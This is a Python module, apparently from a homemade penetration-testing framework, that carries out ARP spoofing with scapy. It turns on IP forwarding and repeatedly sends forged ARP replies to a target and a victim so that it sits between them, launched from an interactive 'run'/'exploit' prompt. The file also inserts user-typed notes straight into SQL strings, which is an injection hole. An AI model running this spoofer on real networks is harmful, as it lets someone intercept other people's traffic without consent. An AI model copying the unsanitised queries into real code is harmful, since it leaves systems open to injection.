import argparse as ap
import sys, os, time, subprocess
import mysql.connector as ms
import pandas as pd
from colorama import Fore, init
import scapy.all as scapy
def Get_MAC(IP):
    arp_request = scapy.ARP(pdst=IP)
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
    result = scapy.srp(broadcast/arp_request, verbose=False, timeout=3)[0]
    try:
        if result[0][1].psrc == IP:
            return result[0][1].hwsrc 
    except IndexError:
        return 0
def Spoofing(Target_IP, Spoof_IP):
    Target_MAC = Get_MAC(Target_IP)
    if Target_MAC == 0:
        return 0
    ARP_Packet = scapy.ARP(op=2, pdst=Target_IP, hwdst = Target_MAC,psrc = Spoof_IP)
    scapy.send(ARP_Packet, verbose=False)

def ARP_Spoofer(Target, Victim):
    subprocess.run('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True)
    while True:
        try:
            while True:   
                Spoofing(Target, Victim)
                Spoofing(Victim, Target)
                time.sleep(10)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(Fore.RED+f"{e}")
            sys.exit(1)

cat = 1
descript = 'This module is used to perform ARP spoofing attacks.'
apar = ap.ArgumentParser(description=descript)
apar.add_argument('-d', '--Description', action='store_true' ,required=False)
apar.add_argument('-c', "--Category", action='store_true', required=False)
ar = apar.parse_args()
if ar.Description:
    print(descript)
    sys.exit(0)
if ar.Category:
    print(cat)
    sys.exit(0)
module = os.path.basename(__file__).split('.')[0]
loc = os.path.dirname(os.path.abspath(__file__))
login = open(f"{loc}/../Data/login.txt")
lg = (login.read()).split('\n')
login.close()
db = ms.connect(host='localhost',user = lg[0], password=lg[1])
cursor = db.cursor()
cursor.execute("USE PentestFW;")
cursor.execute(f"SELECT module_ID FROM Modules WHERE module = '{module}'")
module_ID = cursor.fetchall()[0][0]
cursor.close()
cursor = db.cursor()
cursor.execute("SELECT * FROM Current_User_Table;")
user_ID = cursor.fetchall()[0][0]
init(autoreset=True)
options = {'Target': ['127.0.0.1', 'The target machine`s IP address'], 'Victim': ['127.0.0.1', 'The victim machine`s IP address']}

while True:
    try:
        cmnd = input(f'PentestFW>({Fore.CYAN+module+Fore.RESET})>>>').split()
        if cmnd[0].lower() == 'set':
            if not cmnd[1] in options.keys() or len(cmnd) != 3:
                print(Fore.RED+'You have entered an illegal set command!')
            else:
                options[cmnd[1]][0] = cmnd[2]
        elif cmnd[0].lower() == 'exit':
            notes = input(">>>Enter your notes if exists: ")
            if not notes:
                notes = 'No Notes'
            with db.cursor() as cur:
                cur.execute(f"INSERT INTO Log(module_ID, user_ID, notes) VALUES({module_ID}, {user_ID}, '{notes}')")
                db.commit()
            sys.exit(0)
        elif cmnd[0].lower() == 'run' or cmnd[0].lower() == 'exploit':
            ARP_Spoofer(options['Target'][0], options['Victim'][0])
        elif cmnd[0].lower() == 'options':
            dict = {'Options':[key for key in options.keys()], 'Values':[options[key][0] for key in options.keys()], 'Description':[options[key][1] for key in options.keys()]}
            print(pd.DataFrame(dict))
        else:
            print(Fore.RED+"You have entered an illegal command!")
    except KeyboardInterrupt:
        print(Fore.RED+'You should enter `exit` to exit the module')
    except IndexError:
        print(Fore.RED+"Illegal command!")
